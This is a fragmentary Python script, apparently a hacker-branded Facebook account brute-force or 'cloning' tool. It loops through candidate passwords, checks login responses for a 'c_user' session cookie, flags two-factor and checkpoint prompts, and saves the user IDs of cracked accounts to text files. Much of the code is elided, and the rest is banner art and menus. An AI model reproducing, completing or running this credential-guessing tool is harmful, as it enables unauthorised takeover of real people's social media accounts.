#created by AHAD
#team name hbf
#tottaly written by AHAD 360 Khawaja
#!/usr/bin/python3 
#---------------------[IMPORT]---------------------#
...
class jalan:
    def __init__(self, z):
        for e in z + "\n":
            ...
            sys.stdout.flush()
            time.sleep(0.0001)
sys.stdout.write('\x1b[1;35m\x1b]2; AHAD \x07')
###----------[ IMPORT LIBRARY ]---------- ###
import requests
import bs4
import sys
...
ha = current.day
today = date.today()
AHAD2 = f"\033[1;33m➤{GREEN}➤\x1b[0m"
import random
cokbrut=[]
...
\033[1;31m│\033[1;37m☞  \033[1;32mFACEBOOK   \033[1;31m ➟   \033[1;32m   AHAD 𝟑𝟔𝟎         \033[1;31m
\033[1;31m│\033[1;37m☞  \033[1;32mTELEGRAM   \033[1;31m ➟  \033[1;32m    t.me/bothacker999    \033[1;31m
\033[1;31m│\033[1;37m☞  \033[1;32mYOUTUBE   \033[1;31m   ➟   \033[1;32m    AHAD 𝟑𝟔𝟎    \033[1;31m   
...
def XYZ():
    ...
    print(f'{BLUE}══════════════════════════════════════════════════')
    print(f"\t      {WHITE}[{EXTRA} {AHADT()} {WHITE}]")
    ...
    if AHAD in ["1","01"]:
        ...
        os.system("xdg-open https://www.youtube.com/@AHAD-360")
        XYZ()
    elif AHAD in ["0","00"]:
       exit()
    else:
...
def pass1():
    ...
    print(f'\n[~]{RED}===================================================')
    print('\x1b[38;5;46m[√] OK IDS SAVE : /sdcard/AHAD-OK.txt\n\x1b[38;5;196m[×] CP IDS SAVE : /sdcard/AHAD-CP.txt')
        ...
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                if 'Enter login code to continue' in log_cookies:
                    ...
                    coki1 = coki.split("1000")[1]
                    uid = "1000"+coki1[0:11]
                    #os.system("play-audio AHAD_2F.mp3")
                    ...
                    coki1 = coki.split("1000")[1]
                    uid = "1000"+coki1[0:11]
                  #  os.system("play-audio AHAD_CP.mp3")
